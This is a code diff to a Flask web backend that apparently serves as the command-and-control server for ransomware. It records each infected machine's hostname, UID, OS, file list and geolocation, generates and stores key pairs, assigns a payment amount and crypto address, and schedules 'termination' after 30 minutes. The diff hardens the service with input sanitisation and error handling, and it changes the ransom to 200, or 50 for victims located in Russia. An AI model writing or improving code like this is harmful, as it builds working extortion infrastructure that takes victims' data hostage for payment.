@@ -10,6 +10,7 @@ from application.models import Users, UsersPaid, UsersData
 from utilities.get_ip import user_geolocation
 from application.tasks import schedule_termination
 import pytz
+from bleach import clean
 
 
 tz = pytz.timezone('America/Toronto')
@@ -26,35 +27,46 @@ def new_user():
 
         geolocation = user_geolocation(user_ip)
         data = request.json
+        if not data:
+            return jsonify({"error": "No data provided."}), 400
 
-        existing_user = Users.query.filter_by(uid=data["UID"]).first()
+        required_keys = ["username", "hostname", "uid", "os", "version", "architecture", "email"]
+        if not all(key in data for key in required_keys):
+            return jsonify({"error": "Missing required parameters."}), 400
+
+        sanitized_data = {key: clean(value) for key, value in data.items()}
+        existing_user = Users.query.filter_by(uid=sanitized_data["uid"]).first()
         if existing_user:
             return jsonify({"error": "UID already exists."}), 400
 
         keys = gen_keys()
+        tz = datetime.now().astimezone().tzinfo
         expiration_date = datetime.now(tz=tz) + timedelta(minutes=30)
+        payment = 200
+        if geolocation.get("country") == "Russia":
+            payment = 50
 
         user = Users(
-            username=data.get("Username"),
-            hostname=data.get("Hostname"),
-            uid=data.get("UID"),
-            os_name=data.get("OS"),
-            os_version=data.get("Version"),
-            os_architecture=data.get("Architecture"),
-            email=data.get("User Email"),
+            username=sanitized_data.get("username"),
+            hostname=sanitized_data.get("hostname"),
+            uid=sanitized_data.get("uid"),
+            os_name=sanitized_data.get("os"),
+            os_version=sanitized_data.get("version"),
+            os_architecture=sanitized_data.get("architecture"),
+            email=sanitized_data.get("email"),
             ip_address=user_ip,
             public_key=keys[1],
             private_key=keys[0],
             crypto_address=''.join(random.choices(string.ascii_letters + string.digits, k=16)),
-            total_payment=100,
+            total_payment=payment,
             status=False,
             amount_paid=0,
             creation_date=datetime.now(tz=tz),
             expiration=expiration_date
         )
         user_data = UsersData(
-            uid=data.get("UID"),
-            files=data.get("Files"),
+            uid=sanitized_data.get("uid"),
+            files=sanitized_data.get("files"),
             ip=geolocation.get("IP"),
             city=geolocation.get("city"),
             region=geolocation.get("region"),
@@ -63,15 +75,23 @@ def new_user():
             latitude=geolocation.get("latitude"),
             longitude=geolocation.get("longitude"),
         )
-        db.session.add(user)
-        db.session.add(user_data)
-        db.session.commit()
+
+        try:
+            db.session.add(user)
+            db.session.add(user_data)
+            db.session.commit()
+        except Exception as e:
+            db.session.rollback()
+            return jsonify({"error": "Database error"}), 400
 
         schedule_termination(user.id, expiration_date)
 
         return jsonify({"message": "User and keys added successfully."}), 201
+
     except Exception as e:
-        return jsonify({"error": str(e)}), 400
+        db.session.rollback()
+        print(e)
+        return jsonify({"error": "An unexpected error occurred"}), 400
 
 
 @app.route("/check-payment", methods=["POST"])
@@ -80,9 +100,12 @@ def new_user():
 def check_payment():
     try:
         data = request.json
-        uid = data.get('uid') if data else None
+        if not data:
+            return jsonify({"error": "No data provided."}), 400
+
+        uid = clean(data.get('uid'))
         if not uid:
-            return jsonify({"error": "Request failed."}), 400
+            return jsonify({"error": "No UID provided."}), 400
 
         paid_user = UsersPaid.query.filter_by(uid=uid).first()
         if paid_user and paid_user.status:
